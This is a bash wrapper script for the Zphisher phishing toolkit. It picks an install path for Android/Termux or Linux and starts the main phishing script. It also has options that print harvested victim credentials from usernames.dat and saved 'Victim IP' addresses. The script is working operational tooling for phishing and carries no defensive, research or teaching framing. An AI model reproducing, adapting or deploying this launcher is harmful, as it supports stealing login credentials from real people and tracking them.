#!/bin/bash

# Set the root path based on the operating system
if [[ $(uname -o) == *'Android'* ]]; then
    ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
else
    ZPHISHER_ROOT="/opt/zphisher"
fi

# Display help message
if [[ $1 == '-h' || $1 == 'help' ]]; then
    echo "To run Zphisher, type \`zphisher\` in your cmd"
    echo
    echo "Help:"
    echo " -h | help : Print this menu & Exit"
    echo " -c | auth : View Saved Credentials"
    echo " -i | ip   : View Saved Victim IP"
    echo
# Display saved credentials
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
    cat "$ZPHISHER_ROOT/auth/usernames.dat" 2>/dev/null || { 
        echo "No Credentials Found !"
        exit 1
    }
# Display saved IP addresses
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
    cat "$ZPHISHER_ROOT/auth/ip.txt" 2>/dev/null || {
        echo "No Saved IP Found !"
        exit 1
    }
# Run Zphisher
else
    cd "$ZPHISHER_ROOT" || { 
        echo "Error changing directory to $ZPHISHER_ROOT"
        exit 1
    }
    bash ./zphisher.sh
fi
